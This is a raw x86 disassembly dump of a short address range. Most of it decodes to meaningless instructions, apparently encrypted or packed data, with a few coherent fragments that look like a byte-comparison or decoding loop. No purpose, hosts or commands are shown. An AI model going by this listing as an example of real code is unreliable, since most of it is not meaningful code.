  40803f:	mov    ds:0xd8caa1f8,al
  408044:	mov    ebx,0x83db560c
  408049:	cmp    eax,0xaecb9ca4
  40804e:	push   es
  40804f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408050:	mov    al,ds:0xbb740f7
  408055:	in     eax,0xe7
  408057:	mov    edi,0xa188cd2e
  40805c:	jmp    0x3125:0x9829293c
  408063:	stos   DWORD PTR es:[edi],eax
  408064:	dec    eax
  408065:	out    0xee,al
  408067:	mov    bh,0x1f
  408069:	(bad)  
  40806b:	(bad)  
  40806c:	in     al,dx
  40806d:	xchg   ebp,eax
  40806e:	pop    ecx
  40806f:	stc    
  408070:	ins    BYTE PTR es:[edi],dx
  408071:	mov    ch,0x74
  408073:	cmp    al,0xa4
  408075:	push   edi
  408076:	dec    BYTE PTR [edi]
  408078:	jbe    0x4080f7
  40807a:	fs int3 
  40807c:	ret    0xfc63
  40807f:	into   
  408080:	repnz cli 
  408082:	fs (bad) 
  408084:	push   edx
  408085:	es dec edi
  408087:	inc    edx
  408088:	test   DWORD PTR [edi+0x172f1bfd],esp
  40808e:	cmp    DWORD PTR [edx+0x7f],esp
  408091:	cld    
  408092:	dec    esp
  408093:	push   ds
  408094:	stos   BYTE PTR es:[edi],al
  408095:	fst    QWORD PTR [edi+0x3dfad80a]
  40809b:	mov    edi,0x6b579d45
  4080a0:	sahf   
  4080a1:	ja     0x40807a
  4080a3:	sub    bl,BYTE PTR [ebx+0x59]
  4080a6:	outs   dx,BYTE PTR ds:[esi]
  4080a7:	sub    al,0xa1
  4080a9:	dec    edi
  4080aa:	ror    BYTE PTR es:[ecx+0x6b],1
  4080ae:	clc    
  4080af:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4080b0:	neg    BYTE PTR [edi+0x6b]
  4080b3:	xchg   edx,eax
  4080b4:	scas   eax,DWORD PTR es:[edi]
  4080b5:	lods   eax,DWORD PTR ds:[esi]
  4080b6:	popf   
  4080b7:	loopne 0x4080b8
  4080b9:	test   eax,0xd0308682
  4080be:	js     0x4080c3
  4080c0:	in     eax,dx
  4080c1:	fisttp QWORD PTR [edi]
  4080c3:	ffreep st(0)
  4080c5:	mov    ch,bh
  4080c7:	inc    eax
  4080c8:	mov    ebx,0x1ae99070
  4080cd:	and    eax,0x33e023d6
  4080d2:	rol    DWORD PTR [ebx],0xc6
  4080d5:	mov    DWORD PTR [edx],eax
  4080d7:	mov    eax,DWORD PTR [ebp-0x8]
  4080da:	xor    eax,ecx
  4080dc:	add    eax,esi
  4080de:	mov    DWORD PTR [ebp+0x8],eax
  4080e1:	mov    eax,DWORD PTR [ebp+0x8]
  4080e4:	jmp    0x4083ed
  4080e9:	ret    
  4080ea:	ror    ch,1
  4080ec:	rcr    ecx,0xc9
  4080ef:	rcl    esi,cl
  4080f1:	push   edx
  4080f2:	add    DWORD PTR [edx+0x53d77c75],eax
  4080f8:	xchg   esi,eax
  4080f9:	hlt    
  4080fa:	fnstsw WORD PTR [eax+0x78]
  4080fd:	fs jle 0x408178
  408100:	js     0x408176
  408102:	fdiv   DWORD PTR [ebp+0x22]
  408105:	ret    
  408106:	add    BYTE PTR [ebx-0x1f],bl
  408109:	sub    BYTE PTR [ebx-0x37],al
  40810c:	cld    
  40810d:	(bad)  
  40810e:	mov    ch,0x25
  408110:	inc    edi
  408111:	jbe    0x40816d
  408113:	sti    
  408114:	mov    ch,0xe7
  408116:	xchg   BYTE PTR [ebx],dl
  408118:	push   ebx
  408119:	mov    ecx,0x945176de
  40811e:	ins    BYTE PTR es:[edi],dx
  40811f:	mov    bh,0xe4
  408121:	add    DWORD PTR [eax+0x70],ebp
  408124:	in     eax,0xe4
  408126:	jmp    0x4983:0xfb2f83fc
  40812d:	mov    ds:0x376edf52,eax
  408132:	ret    
  408133:	xor    ebx,ecx
  408135:	jl     0x40817a
  408137:	loopne 0x408115
  408139:	pop    edx
  40813a:	daa    
  40813b:	pop    ecx
  40813c:	clc    
  40813d:	mov    ebx,0x670a0268
  408142:	mov    ebx,0xe9e696fb
  408147:	stos   DWORD PTR es:[edi],eax
  408148:	fxch   st(5)
  40814a:	adc    eax,0x2efd633c
  40814f:	sub    BYTE PTR [ebx],bl
  408151:	jno    0x4080ed
  408153:	jecxz  0x40813d
  408155:	inc    ebx
  408156:	inc    eax
  408157:	(bad)  
  408158:	out    0x97,eax
  40815a:	mov    WORD PTR [ebx+0x28c66b44],?
  408160:	xor    bh,BYTE PTR [esp+edx*2]
  408163:	pop    eax
  408164:	cmp    bh,BYTE PTR [esp+edx*4-0x4]
  408168:	mov    dl,0x6a
  40816a:	cmp    ch,ch
  40816c:	lock pop edi
  40816e:	pop    ecx
  40816f:	mov    ds:0x77797b2,eax
  408174:	mov    eax,ds:0xf0941ce5
  408179:	push   ebp
  40817a:	leave  
  40817b:	push   ecx
  40817c:	mov    ebp,esp
  40817e:	jge    0x4081ce
  408180:	push   0xffffff95
  408182:	ds popa 
  408184:	adc    BYTE PTR [ebp-0x48],dl
  408187:	pop    ds
  408188:	and    DWORD PTR [eax],edi
  40818a:	inc    edi
  40818b:	cmp    al,0xb8
  40818d:	inc    ecx
  40818e:	fcomp  DWORD PTR [eax+eax*1]
  408191:	mov    al,ds:0xe1ac3573
  408196:	fwait
  408197:	iret   
  408198:	adc    BYTE PTR [edi+0x75],ah
  40819b:	and    DWORD PTR [edx],esp
  40819d:	retf   
  40819e:	call   0x116174e8
  4081a3:	adc    cl,ch
  4081a5:	fistp  DWORD PTR [edi-0x11227c53]
  4081ab:	sub    al,0xbf
  4081ad:	sahf   
  4081ae:	neg    DWORD PTR [ecx-0x66f1d873]
  4081b4:	fwait
  4081b5:	or     esi,DWORD PTR [ebx+0x4423548b]
  4081bb:	pop    esp
  4081bc:	repz imul esp,eax,0x50
  4081c0:	jge    0x408201
  4081c2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4081c3:	push   es
  4081c4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4081c5:	fild   QWORD PTR [ebp+0x34]
  4081c8:	in     eax,dx
  4081c9:	jb     0x408222
  4081cb:	mov    edi,0x4238437f
  4081d0:	mov    ecx,0x7c907111
  4081d5:	test   eax,0x6161e95f
  4081da:	arpl   WORD PTR [edi+0x4cb8875],dx
  4081e0:	cmp    DWORD PTR [ecx-0x24],0x3c
  4081e4:	popa   
  4081e5:	pop    ecx
  4081e6:	adc    bl,BYTE PTR [ebx]
  4081e8:	jo     0x4081ac
  4081ea:	jmp    0xc24e37a0
  4081ef:	adc    ecx,DWORD PTR [edi+0x2e]
  4081f2:	retf   0x3a8b
  4081f5:	inc    ebx
  4081f6:	fwait
  4081f7:	push   edi
  4081f8:	into   
  4081f9:	imul   ebp,DWORD PTR [edi],0xffffff9f
  4081fc:	popa   
  4081fd:	popf   
  4081fe:	mov    edi,esi
  408200:	mov    cl,0x65
  408202:	std    
  408203:	in     eax,0x6d
  408205:	sub    bl,BYTE PTR [eax]
  408207:	xchg   esi,eax
  408208:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408209:	sbb    al,0xaa
  40820b:	addr16 xchg ebp,eax
  40820d:	mov    esi,0xdd383ef
  408212:	outs   dx,DWORD PTR ds:[esi]
  408214:	mov    cl,0x54
  408216:	popf   
  408217:	push   0xffffffb0
  408219:	push   ss
  40821a:	jmp    0x40821c
  40821c:	inc    ebx
  40821d:	mov    ebp,0x581edd48
  408222:	cmp    BYTE PTR [eax+0x19],ch
  408225:	pop    esp
  408226:	push   es
  408227:	jg     0x4082a2
  408229:	imul   edx,DWORD PTR [esi],0x15d15719
  40822f:	xchg   edi,eax
  408230:	xchg   esi,eax
  408231:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408232:	fistp  DWORD PTR [ebp+0x1d]
  408235:	iret   
  408236:	xor    ch,ah
  408238:	mov    edi,0xd411f5aa
  40823d:	xchg   esi,eax
  40823e:	adc    bh,BYTE PTR [esi-0x35]
  408241:	push   0x32
  408243:	mov    esi,0x2f544b32
  408248:	rol    DWORD PTR [esi-0x64],cl
  40824b:	adc    al,0x50
  40824d:	dec    ebp
  40824e:	sahf   
  40824f:	push   0xdd5585d2
  408254:	pop    eax
  408255:	pop    esi
  408256:	lods   al,BYTE PTR ds:[esi]
  408257:	adc    DWORD PTR [ecx+0x17],edi
  40825a:	add    al,BYTE PTR [ebx]
  40825c:	out    0x9,al
  40825e:	sar    DWORD PTR [edx],0xff
  408261:	sbb    esp,DWORD PTR [edx]
  408263:	push   esp
  408264:	xor    eax,0x7928bc81
  408269:	or     al,0xfb
  40826b:	jne    0x40828b
  40826d:	pop    esi
  40826e:	loopne 0x4082ea
  408270:	scas   al,BYTE PTR es:[edi]
  408271:	jge    0x4082b1
  408273:	adc    ebx,ecx
  408275:	(bad)  
  408276:	fdivr  QWORD PTR [edx-0x41]
  408279:	and    bh,dl
  40827b:	vmwrite edi,DWORD PTR [edx+edx*4-0x54]
  408280:	aam    0x9
  408282:	scas   eax,DWORD PTR es:[edi]
  408283:	push   edi
  408284:	popa   
  408285:	and    al,0x6d
  408287:	out    dx,ax
  408289:	sub    BYTE PTR [ebp+0x30],bl
  40828c:	jnp    0x4082e2
  40828e:	aas    
  40828f:	fimul  WORD PTR [ebx+0x3eebb41c]
  408295:	inc    ebp
  408296:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408297:	xor    eax,0x2cb078f8
  40829c:	mov    bl,0xac
  40829e:	mov    BYTE PTR [ebp+eiz*4-0x4f4517e0],cl
  4082a5:	sbb    dh,bl
  4082a7:	pop    esi
  4082a8:	imul   esp,DWORD PTR ds:0xc06b716a,0xffffffd7
  4082af:	aam    0x53
  4082b1:	fstp   QWORD PTR [eax]
  4082b3:	push   cs
  4082b4:	js     0x40826c
  4082b6:	(bad)  
  4082b7:	test   esp,ebp
  4082b9:	push   edi
  4082ba:	push   cs
  4082bb:	adc    DWORD PTR [eax],ebx
  4082bd:	scas   al,BYTE PTR es:[edi]
  4082be:	imul   ecx,ebx,0xa102ed8
  4082c4:	or     eax,0x34a26af1
  4082c9:	jns    0x40833d
  4082cb:	fisubr WORD PTR fs:[ecx+0x55]
  4082cf:	mov    ah,0xe1
  4082d1:	mov    edx,0xdef46475
  4082d6:	mov    cl,0x52
  4082d8:	mov    eax,0x7bf2a96d
  4082dd:	lock mov cl,0x9a
  4082e0:	sbb    eax,0x14c88119
  4082e5:	gs pop ss
  4082e7:	mov    al,0x87
  4082e9:	fsub   QWORD PTR [esi-0x6c]
  4082ec:	jle    0x408367
  4082ee:	cmp    esp,edi
  4082f0:	in     eax,0xc7
  4082f2:	push   ecx
  4082f3:	out    dx,eax
  4082f4:	mov    ebx,0xd709f074
  4082f9:	mov    WORD PTR [edi-0x73],ds
  4082fc:	mov    esi,0xab616079
  408301:	test   eax,0x8d16b997
  408306:	jle    0x40835b
  408308:	or     eax,0x5946fc95
  40830d:	adc    dl,ah
  40830f:	jl     0x4082c8
  408311:	inc    DWORD PTR [edx]
  408313:	sbb    eax,0x179b37a0
  408318:	out    dx,al
  408319:	jo     0x40837a
  40831b:	jmp    0xd4be:0x94114a4e
  408322:	push   edi
  408323:	mov    esp,0x29b65c5
  408328:	outs   dx,DWORD PTR ds:[esi]
  408329:	mov    al,0x96
  40832b:	cmp    eax,DWORD PTR [edx+0x103b174f]
  408331:	xlat   BYTE PTR ds:[ebx]
  408332:	and    BYTE PTR [ebx-0x390f6213],dl
  408338:	xchg   esi,eax
  408339:	dec    esp
  40833a:	jbe    0x408376
  40833c:	xor    BYTE PTR [esi],ah
  40833e:	sub    esp,DWORD PTR ds:0x74beb733
  408344:	nop
  408345:	neg    BYTE PTR [edx-0x74]
  408348:	add    eax,0x85d92282
  40834d:	mov    ecx,0xd156897c
  408352:	jnp    0x40830d
  408354:	aas    
  408355:	es mov eax,eax
  408358:	cwde   
  408359:	mov    edx,DWORD PTR [eax]
  40835b:	or     BYTE PTR [edi+0x453c25d9],dh
  408361:	cmp    al,0x9f
  408363:	fwait
  408364:	jnp    0x40833a
  408366:	inc    eax
  408367:	mov    al,0xb7
  408369:	mov    ds:0xe1b4bdd7,eax
  40836e:	test   BYTE PTR [edx],0xf7
  408371:	int3   
  408372:	push   ebx
  408373:	sub    ecx,0x5507350d
  408379:	loope  0x408321
  40837b:	mov    dh,0xa3
  40837d:	cmp    BYTE PTR [edi+ebp*2+0x2806a19b],bl
  408384:	adc    esi,ebp
  408386:	ror    ebp,cl
  408388:	shl    DWORD PTR [edi+0x32c3369a],0xae
  40838f:	sub    DWORD PTR [ebp+0x23],eax
  408392:	ret    0x5ada
  408395:	cmp    al,0x13
  408397:	test   eax,0xe84463eb
  40839c:	mov    ah,0x83
  40839e:	mov    eax,0x87bbdb35
  4083a4:	sbb    ebx,DWORD PTR [ebp+eax*8+0x7ff24874]
  4083ab:	cmp    DWORD PTR [esi+0x75],0xffffffd8
  4083af:	ds clc 
  4083b1:	pusha  
  4083b2:	xor    esp,edx
  4083b4:	cmp    eax,0x7e7e7536
  4083b9:	or     al,0xb9
  4083bb:	fcmovnu st,st(1)
  4083bd:	aad    0x83
  4083bf:	fs pop esp
  4083c1:	call   0xbd93c0bc
  4083c6:	fsubr  st,st(3)
  4083c8:	sti    
  4083c9:	and    DWORD PTR ds:0x289516c,ebp
  4083cf:	out    dx,al
  4083d0:	mov    eax,0x30452dee
  4083d5:	mov    ds:0x47209857,al
  4083da:	pop    edi
  4083db:	add    DWORD PTR [ebp+ebp*1+0x37b5b55],ecx
  4083e2:	leave  
  4083e3:	rcl    ebp,cl
  4083e5:	push   0xffffff98
  4083e7:	jnp    0x4083cb
  4083e9:	pandn  mm6,QWORD PTR [ecx-0x68]
  4083ed:	mov    al,BYTE PTR [ebp+eax*1-0x58]
  4083f1:	mov    dl,BYTE PTR [ebp-0x1]
  4083f4:	cmp    al,dl
  4083f6:	je     0x408742
  4083fc:	mov    eax,DWORD PTR [ebp+0x8]
  4083ff:	mov    al,BYTE PTR [ebp+eax*1-0x58]
  408403:	mov    edx,DWORD PTR [ebp+0xc]
  408406:	cmp    al,BYTE PTR [edx]
  408408:	jne    0x408a71
  40840e:	mov    eax,DWORD PTR [ebp-0x8]
  408411:	mov    edx,DWORD PTR [ebp+0xc]
  408414:	movsx  edx,BYTE PTR [edx]
  408417:	xor    eax,ecx
  408419:	add    eax,esi
  40841b:	cmp    edx,eax
  40841d:	je     0x40875c
  408423:	mov    DWORD PTR [ebp-0x18],0x705fd8e
  40842a:	jmp    0x408733
  40842f:	cmp    al,0xc8
  408431:	rcl    dl,0xd4
  408434:	fcmovu st,st(2)
  408436:	into   
  408437:	(bad)  
  408438:	leave  
  408439:	xchg   BYTE PTR [edi-0x4c2e5c16],dl
  40843f:	loopne 0x408423
  408441:	js     0x4084bb
  408443:	fs jle 0x4084be
  408446:	js     0x40844c
  408448:	jno    0x40845c
  40844a:	rol    DWORD PTR [esp+eax*8+0x48d89789],cl
  408451:	jns    0x408476
  408453:	xchg   ebx,eax
  408454:	cli    
  408455:	or     al,0xcd
  408457:	lods   al,BYTE PTR ds:[esi]
  408458:	fistp  WORD PTR [ecx]
  40845a:	mov    esi,0x88149c25
  40845f:	aaa    
  408460:	test   al,0x90
  408462:	lds    ebp,FWORD PTR [edi-0x14d828ef]
  408468:	loopne 0x408425
  40846a:	adc    ecx,esi
  40846c:	ins    DWORD PTR es:[edi],dx
  40846d:	xor    ebp,DWORD PTR [ecx-0x34]
  408470:	pop    ss
  408471:	jmp    0x82bc3b7b
  408476:	and    edx,0x618aa94f
  40847c:	stc    
  40847d:	mov    ds,WORD PTR [ebx+0x580f5f8a]
  408483:	sahf   
  408484:	push   edx
  408485:	aam    0xd5
  408487:	cmp    eax,0xdffe3af
  40848c:	mov    WORD PTR [ecx+0x17],?
  40848f:	fnstsw WORD PTR [esi-0x3290e727]
  408495:	xchg   esp,eax
  408496:	mov    cl,0x3f
  408498:	in     al,0x2b
  40849a:	pop    es
  40849b:	dec    ebx
  40849c:	jl     0x4084d2
  40849e:	aad    0xc8
  4084a0:	enter  0x28ab,0x99
  4084a4:	push   edi
  4084a5:	pop    ebx
  4084a6:	mov    ecx,0x78a2194b
  4084ab:	jmp    0xbf7e:0x32d37f2b
  4084b2:	gs jle 0x408440
  4084b5:	pop    ds
  4084b6:	inc    ebx
  4084b7:	mov    dl,BYTE PTR [eax-0x6e]
  4084ba:	and    bl,BYTE PTR [ecx-0x9488e2e]
  4084c0:	ss jle 0x408534
  4084c3:	mov    cl,0xf0
  4084c5:	jg     0x408478
  4084c7:	(bad)  
  4084c9:	mov    dl,0xbf
  4084cb:	sar    BYTE PTR [edx+ecx*8+0x5335995a],cl
  4084d2:	ins    BYTE PTR es:[edi],dx
  4084d3:	jbe    0x40850d
  4084d5:	das    
  4084d6:	xor    al,0x35
  4084d8:	push   eax
  4084d9:	out    0x3c,al
  4084db:	add    al,0x87
  4084dd:	scas   al,BYTE PTR es:[edi]
  4084de:	mov    ds:0x908198f7,al
  4084e3:	(bad)  
  4084e4:	push   edx
  4084e5:	push   esp
  4084e6:	pop    edi
  4084e7:	ret    0x977f
  4084ea:	and    al,0x62
  4084ec:	adc    al,0xa4
  4084ee:	cmc    
  4084ef:	and    al,0xa7
  4084f1:	jg     0x408558
  4084f3:	les    ebp,FWORD PTR [ecx+0x1e]
  4084f6:	fwait
  4084f7:	call   0x9fe6:0x6a71e9f3
  4084fe:	or     al,0xd2
  408500:	push   eax
  408501:	inc    eax
  408502:	adc    bh,BYTE PTR [esi+0x2c4b7a]
  408508:	mov    al,0x7f
  40850a:	neg    eax
  40850c:	aad    0x63
  40850e:	pop    eax
  40850f:	jl     0x408536
  408511:	xor    dh,BYTE PTR [ecx]
  408513:	and    edi,ebp
  408515:	adc    edi,DWORD PTR [eax-0x66]
  408518:	dec    edi
  408519:	adc    al,BYTE PTR [edi+0x6220b661]
  40851f:	pusha  
  408520:	or     DWORD PTR [ebp+0x21043861],eax
  408526:	jg     0x408518
  408528:	cdq    
  408529:	adc    BYTE PTR [eax+eiz*1],bh
  40852c:	sbb    eax,0x6bd7ce7f
  408531:	xor    al,0x4f
  408533:	add    ebp,eax
  408535:	mov    dh,0x3f
  408537:	iret   
  408538:	dec    edi
  408539:	fwait
  40853a:	(bad)
  40853d:	or     al,0x20
  40853f:	xchg   BYTE PTR [edx+edi*1],ch
  408542:	lods   al,BYTE PTR ds:[esi]
  408543:	or     al,0x30
  408545:	pop    edi
  408546:	inc    edi
  408547:	retf   0xf7e0
  40854a:	or     eax,0xaa56692d
  40854f:	js     0x4084e0
  408551:	div    BYTE PTR [edx]
  408553:	test   DWORD PTR [ecx],edi
  408555:	jecxz  0x408527
  408557:	gs or  al,0x26
  40855a:	rcl    esp,1
  40855c:	pusha  
  40855d:	int    0x1
  40855f:	add    DWORD PTR [edi-0x41],ebp
  408562:	xchg   DWORD PTR [ebx-0x56c5dfcf],esp
  408568:	jbe    0x4085d6
  40856a:	nop
  40856b:	and    BYTE PTR ds:0x64e9527f,cl
  408571:	inc    ebx
  408572:	jle    0x408586
  408574:	xchg   BYTE PTR [edx+0x12],dh
  408577:	dec    esp
  408578:	cwde   
  408579:	aas    
  40857a:	push   ebp
  40857b:	shr    BYTE PTR ds:0xfc32b31f,cl
  408581:	mov    ah,0x8c
  408583:	sar    ebx,1
  408585:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408586:	xchg   ecx,eax
  408587:	jmp    0xcf82:0x16e15ff1
  40858e:	loope  0x40858f
  408590:	and    dh,0xe9
  408593:	push   ss
  408594:	test   BYTE PTR [ebp-0x9],al
  408597:	ins    BYTE PTR es:[edi],dx
  408598:	pushf  
  408599:	mov    ebp,0xa8000f0
  40859e:	jmp    0xc36f5fe7
  4085a3:	mov    dl,0x3b
  4085a5:	push   edx
  4085a6:	scas   al,BYTE PTR es:[edi]
  4085a7:	call   0x73655efa
  4085ac:	or     BYTE PTR [esi-0x313b60b4],cl
  4085b2:	bound  eax,QWORD PTR [edx+0x4fd4b377]
  4085b8:	in     al,dx
  4085b9:	inc    eax
  4085ba:	outs   dx,BYTE PTR ds:[esi]
  4085bb:	mov    esp,0xec3eee4f
  4085c0:	cmp    DWORD PTR [edx+0xf849b8d],edi
  4085c6:	mov    eax,0x8c67e584
  4085cb:	jb     0x40864a
  4085cd:	in     eax,0xf7
  4085cf:	test   al,0xa4
  4085d1:	push   ecx
  4085d2:	int3   
  4085d3:	mov    bh,0x61
  4085d5:	pop    edx
  4085d6:	fst    QWORD PTR [edi-0x6908e4b0]
  4085dc:	pop    ebp
  4085dd:	int    0x72
  4085df:	ret    
  4085e0:	hlt    
  4085e1:	and    ah,BYTE PTR [esi]
  4085e3:	cmp    ebx,DWORD PTR [edi+edx*1]
  4085e6:	ja     0x4085ac
  4085e8:	scas   al,BYTE PTR es:[edi]
  4085e9:	ss and esp,0xddca1603
  4085f0:	popa   
  4085f1:	sbb    ebp,DWORD PTR cs:[eax+0x1b]
  4085f5:	cmc    
  4085f6:	aaa    
  4085f7:	pop    ebx
  4085f8:	aas    
  4085f9:	repz push ds
  4085fb:	xchg   ecx,eax
  4085fc:	fmulp  st(4),st
  4085fe:	jno    0x40864f
  408600:	stos   BYTE PTR es:[edi],al
  408601:	aaa    
  408602:	cmp    DWORD PTR [ebx+0x5fa339b3],esp
  408608:	fmul   st,st(0)
  40860a:	jge    0x408614
  40860c:	sub    BYTE PTR [ebx],bl
  40860e:	inc    esi
  40860f:	in     eax,dx
  408610:	jl     0x408608
  408612:	mov    ds:0x821c7b,eax
  408617:	sti    
  408618:	sbb    eax,0x71e452c0
  40861d:	dec    edi
  40861e:	(bad)  
  40861f:	xchg   edx,eax
  408620:	jae    0x408670
  408622:	loopne 0x408695
  408624:	push   es
  408625:	cmp    BYTE PTR [edx+0x4e],al
  408628:	(bad)  
  408629:	xchg   edi,eax
  40862a:	(bad)  
  40862b:	jecxz  0x4085f6
  40862d:	push   edi
  40862e:	test   DWORD PTR [ebx-0x65],0x65fc3d94
  408635:	jae    0x40868a
  408637:	lods   eax,DWORD PTR ds:[esi]
  408638:	(bad)  
  408639:	nop
  40863a:	pop    esi
  40863b:	retf   0xe13d
  40863e:	das    
  40863f:	adc    ch,BYTE PTR es:[edx+edi*8]
  408643:	sub    eax,0xe9e81a8c
  408648:	xchg   edi,eax
  408649:	add    eax,0xe10f9487
  40864e:	dec    eax
  40864f:	add    edi,edi
  408651:	clc    
  408652:	pop    edx
  408653:	(bad)  
  408654:	pop    ecx
  408655:	repnz (bad) 
  408658:	mov    ah,0xf4
  40865a:	dec    esp
  40865b:	rcl    BYTE PTR [ecx-0x16a7cc15],1
  408661:	or     DWORD PTR [edx],esp
  408663:	sbb    eax,0x79b3ad2d
  408668:	rcr    dh,0x1d
  40866b:	repnz add edx,DWORD PTR ds:0x711d1469
  408672:	stos   BYTE PTR es:[edi],al
  408673:	dec    eax
  408674:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408675:	and    dh,cl
  408677:	adc    edx,DWORD PTR [edi+0x42]
  40867a:	repz cmp BYTE PTR [ebp-0x285505fd],al
  408681:	test   eax,0x40be7e24
  408686:	cmp    bl,ch
  408688:	xchg   DWORD PTR [ebx-0x69],ebp
  40868b:	add    eax,0x28b64338
  408690:	jno    0x4086d3
  408692:	dec    ecx
  408693:	adc    eax,0x76e4c724
  408698:	ins    DWORD PTR es:[edi],dx
  408699:	or     dl,bl
  40869b:	(bad)  
  40869c:	pop    ebx
  40869d:	sbb    bh,al
  40869f:	mov    ebx,0x27a755b4
  4086a4:	fnstsw WORD PTR [ecx+0xf]
  4086a7:	sbb    eax,0x7f97f76f
  4086ac:	push   eax
  4086ad:	(bad)  
  4086ae:	sub    eax,0x1e9af91c
  4086b3:	dec    esi
  4086b4:	pop    ds
  4086b5:	fidivr DWORD PTR [eax-0x29d2c76d]
  4086bb:	sbb    BYTE PTR [edx],bl
  4086bd:	cmp    al,0xcc
  4086bf:	icebp  
  4086c0:	jl     0x4086bd
  4086c2:	jg     0x40868a
  4086c4:	loopne 0x40867e
  4086c6:	push   edx
  4086c7:	lock daa 
  4086c9:	aam    0xce
  4086cb:	es into 
  4086cd:	inc    esp
  4086ce:	dec    edi
  4086cf:	imul   edx,DWORD PTR [ecx+esi*2+0xd],0x4c0140d1
  4086d7:	jl     0x408752
  4086d9:	push   esi
  4086da:	ins    BYTE PTR es:[edi],dx
  4086db:	jns    0x4086bf
  4086dd:	sub    ah,ch
  4086df:	mov    BYTE PTR [esi],bh
  4086e1:	sub    eax,0x94d2b315
  4086e6:	(bad)  
  4086e7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4086e8:	sub    DWORD PTR [esp+eiz*2],ecx
  4086eb:	cmp    eax,0x89505319
  4086f0:	dec    esi
  4086f1:	push   esi
  4086f2:	pop    esi
  4086f3:	xchg   esp,eax
  4086f4:	mov    ds:0x3e6c72a2,eax
  4086f9:	jl     0x40871b
  4086fb:	inc    ecx
  4086fc:	sbb    bh,BYTE PTR [edi-0x17]
  4086ff:	mov    ebx,0x1ed5f50b
  408704:	sub    ebp,ebp
  408706:	test   DWORD PTR [esi+0x48c32437],ecx
  40870c:	out    0xdf,al
  40870e:	retf   0xb06e
  408711:	loop   0x408730
  408713:	div    BYTE PTR [edi]
  408715:	enter  0x6e58,0x21
  408719:	or     BYTE PTR fs:[esi],dl
  40871c:	and    BYTE PTR [eax+edi*8+0x20],ah
  408720:	jo     0x408744
  408722:	push   ecx
  408723:	imul   BYTE PTR [edx+0x24]
  408726:	inc    esp
  408727:	(bad)  
  408728:	mov    ds:0x9bb7589,eax
  40872d:	aam    0xc5
  40872f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408730:	stc    
  408731:	leave  
  408732:	loop   0x4086c1
  408734:	inc    ebp
  408735:	call   0x8c2cccc3
  40873a:	inc    ebp
  40873b:	in     al,dx
  40873c:	add    DWORD PTR [eax],0x705fa8e
  408742:	mov    eax,DWORD PTR [ebp-0x10]
  408745:	mov    edx,DWORD PTR [ebp+0x8]
  408748:	xor    eax,ecx
  40874a:	lea    eax,[eax+edx*1+0x327298]
  408751:	mov    DWORD PTR [ebp+0x8],eax
  408754:	inc    DWORD PTR [ebp+0xc]
  408757:	jmp    0x4080e1
  40875c:	mov    eax,DWORD PTR [ebp-0x10]
  40875f:	xor    eax,ecx
  408761:	mov    ecx,DWORD PTR [ebp+0x10]
  408764:	add    eax,esi
  408766:	jmp    0x408a6f
  40876b:	(bad)
  40876e:	aas    
  40876f:	fld    st(3)
  408771:	(bad)  
  408773:	add    edi,DWORD PTR [ebp-0x7e]
  408776:	sahf   
  408777:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408778:	ffreep st(4)
  40877a:	ror    ah,1
  40877c:	out    0x78,eax
  40877e:	js     0x4087e4
  408780:	jle    0x4087fa
  408782:	js     0x408766
  408784:	(bad)  
  408785:	sbb    eax,0x414bec94
  40878a:	shl    edi,0xe5
  40878d:	dec    eax
  40878e:	inc    ebx
  40878f:	test   DWORD PTR [esi+edx*4],edx
  408792:	pop    es
  408793:	pop    esi
  408794:	adc    esi,edx
  408796:	fdivr  QWORD PTR ds:0x2e054d61
  40879c:	sub    esi,DWORD PTR [esi]
  40879e:	leave  
  40879f:	fisttp WORD PTR [edx-0x7b]
  4087a2:	push   ss
  4087a3:	cs pop edx
  4087a5:	inc    esp
  4087a6:	arpl   WORD PTR [eax-0x3aeabe10],ax
  4087ac:	sahf   
  4087ad:	xchg   ecx,eax
  4087ae:	mov    ah,0xb4
  4087b0:	call   FWORD PTR [ebx]
  4087b2:	arpl   WORD PTR [esi],dx
  4087b4:	mov    ds:0xc502b262,al
  4087b9:	fwait
  4087ba:	aaa    
  4087bb:	sbb    BYTE PTR [edi-0x41],0x1
  4087bf:	and    ah,cl
  4087c1:	sbb    dl,BYTE PTR [edi-0x13]
  4087c4:	rcr    BYTE PTR ss:[esi],0x84
  4087c8:	leave  
  4087c9:	inc    edx
  4087ca:	sbb    BYTE PTR [edi],cl
  4087cc:	mov    dh,0x71
  4087ce:	mov    edx,0x1637ea3
  4087d3:	add    BYTE PTR [edi-0x3d041b75],ah
  4087d9:	cmp    al,0xa7
  4087db:	aas    
  4087dc:	sbb    al,0xb7
  4087de:	push   edi
  4087df:	sbb    DWORD PTR [eax-0x107a9bf4],esi
  4087e5:	jl     0x40882c
  4087e7:	push   eax
  4087e8:	ret    
  4087e9:	mov    dl,0xc2
  4087eb:	pushf  
  4087ec:	jmp    0x4bf6:0xb8cabc47
  4087f3:	fbstp  TBYTE PTR [eax+0x73fbe518]
  4087f9:	int3   
  4087fa:	mov    eax,0x58384afa
  4087ff:	test   BYTE PTR [edi],cl
  408801:	push   edx
  408802:	mov    esp,0xfd3921a8
  408807:	jp     0x4087e5
  408809:	xchg   ebp,eax
  40880a:	xor    eax,0x7cef0fd9
  40880f:	add    eax,0x30083804
  408814:	or     DWORD PTR [ebx-0x14ecdad5],esp
  40881a:	mov    DWORD PTR [ebx+0x301f3915],ebx
  408820:	arpl   si,di
  408822:	xor    al,BYTE PTR [esi+0x61b70bb6]
  408828:	mov    eax,0xfea85e61
  40882d:	inc    eax
  40882e:	mov    DWORD PTR [ecx],eax
  408830:	sti    
  408831:	scas   eax,DWORD PTR es:[edi]
  408832:	cwde   
  408833:	pusha  
  408834:	pop    ss
  408835:	adc    ebp,ecx
  408837:	push   ecx
  408838:	enter  0x4949,0x69
  40883c:	adc    ecx,DWORD PTR [ebx-0x76bee69c]
  408842:	and    edi,DWORD PTR [edx+eax*2-0x7c]
  408846:	pusha  
  408847:	aam    0xa3
  408849:	dec    ebp
